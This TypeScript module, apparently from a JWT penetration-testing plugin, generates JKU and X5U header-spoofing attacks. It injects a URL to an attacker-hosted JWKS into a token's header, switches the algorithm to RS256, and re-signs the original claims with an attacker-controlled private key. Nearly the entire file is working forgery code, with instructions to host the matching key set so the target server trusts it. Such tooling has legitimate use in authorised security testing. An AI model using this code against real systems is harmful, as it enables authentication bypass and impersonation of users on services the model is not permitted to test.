/**
 * JKU / X5U Spoofing Attacks (JWKS Injection via attacker-hosted keys)
 *
 * jku (JSON Web Key Set URL): the attacker sets the jku header to a URL they
 *   control, hosting a JWKS that contains their own public key, then signs with
 *   the matching private key.
 *
 * x5u (X.509 URL): same idea via the x5u header.
 *
 * The attack is ALWAYS attempted regardless of the original token's algorithm or
 * whether it already had a jku/x5u header: the header is injected and the
 * algorithm is switched to RS256 (the asymmetric verification path the server
 * must take to fetch a key from the jku/x5u URL).
 *
 * The signing key pair is the persisted spoofing key pair (generated on install,
 * regenerable from the Configuration tab). The matching JWKS document — which
 * the user must host at jwksUrl — is stored alongside it so they never drift.
 */

import { signRSA } from "../crypto/jwt.js";
import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
import { nanoid } from "../util.js";

// The kid embedded in both the spoofed token header and the hosted JWKS document.
// Must match the kid used when the JWKS is generated (see generateSpoofKeyPair).
export const SPOOF_KID = "jwt-attacker-spoof-key";

// Placeholder used when no JWKS Endpoint URL has been configured yet, so the
// attack is still generated (and the caller surfaces a "configure the URL" hint).
const PLACEHOLDER_URL = "https://YOUR-SERVER.example/.well-known/jwks.json";

export function buildJKUSpoofAttacks(
  parsed: ParsedJWT,
  config: PluginConfig
): { attacks: AttackResult[]; jwksContent: string | null; jwksKey: string | null } {
  const results: AttackResult[] = [];

  // A signing key is required; the caller ensures one exists (persisted or
  // generated on demand).
  if (!config.spoofPrivateKeyPem) {
    return { attacks: [], jwksContent: config.spoofJwksJson || null, jwksKey: null };
  }

  const privateKeyPem = config.spoofPrivateKeyPem;
  const url = config.jwksUrl || PLACEHOLDER_URL;
  const originalAlg = (parsed.header.alg as string) || "none";
  const algNote = originalAlg === "RS256" ? "" : ` (algorithm switched ${originalAlg} → RS256)`;
  const urlNote = config.jwksUrl ? "" : " ⚠ Set the JWKS Endpoint URL in Configuration for a real test.";

  const sign = (extraHeader: Record<string, unknown>): string => {
    const header = {
      ...parsed.header,
      alg: "RS256",
      kid: SPOOF_KID,
      jwk: undefined,
      jku: undefined,
      x5u: undefined,
      x5c: undefined,
      ...extraHeader,
    };
    return signRSA(header as Parameters<typeof signRSA>[0], parsed.payload, privateKeyPem, "RS256");
  };

  if (config.enabledAttacks.jkuSpoof) {
    try {
      results.push({
        id: nanoid(),
        technique: "jkuSpoof",
        techniqueName: `JKU Spoofing (RS256)${algNote ? " " + algNote.trim() : ""}`,
        description:
          `Injects a jku header pointing at ${url} and signs with the persisted spoofing key${algNote}. ` +
          "Host the JWKS shown in the Configuration tab at that URL so the server fetches the attacker's key." +
          urlNote,
        modifiedJWT: sign({ jku: url }),
        timestamp: Date.now(),
        signingKeyPem: privateKeyPem,
      });
    } catch { /* ignore */ }
  }

  if (config.enabledAttacks.x5uSpoof) {
    try {
      results.push({
        id: nanoid(),
        technique: "x5uSpoof",
        techniqueName: `X5U Spoofing (RS256)${algNote ? " " + algNote.trim() : ""}`,
        description:
          `Injects an x5u header pointing at ${url} and signs with the persisted spoofing key${algNote}. ` +
          "Host the matching certificate / key at that URL." +
          urlNote,
        modifiedJWT: sign({ x5u: url }),
        timestamp: Date.now(),
        signingKeyPem: privateKeyPem,
      });
    } catch { /* ignore */ }
  }

  return { attacks: results, jwksContent: config.spoofJwksJson || null, jwksKey: privateKeyPem };
}
